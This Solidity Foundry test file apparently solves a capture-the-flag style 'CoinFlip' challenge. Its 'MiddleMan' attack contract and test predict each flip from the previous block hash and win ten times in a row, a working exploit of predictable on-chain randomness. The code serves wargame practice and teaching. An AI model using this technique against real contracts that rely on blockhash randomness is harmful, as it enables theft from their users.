// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract MiddleMan {
    CoinFlip coinFlip;

    constructor(address prey) {
        coinFlip = CoinFlip(prey);
    }

    function attack() public {
        bool answer = get_answer();
        coinFlip.flip(answer);
    }

    function get_answer() public returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1;
    }
}

contract CoinFlipTest is Test {
    CoinFlip coinFlip;
    uint256 blockNumber;

    function setUp() public {
        coinFlip = new CoinFlip();
        blockNumber = block.number;
    }

    function testFlip() public {
        for (uint i = 0; i < 10; i++) {
            bool answer = get_answer();
            console.log("answer: ", answer);

            coinFlip.flip(answer);
            assertEq(coinFlip.consecutiveWins(), i + 1);

            vm.roll(block.number + 1);
        }
        assertEq(coinFlip.consecutiveWins(), 10);
    }

    function get_answer() public returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1;
    }
}
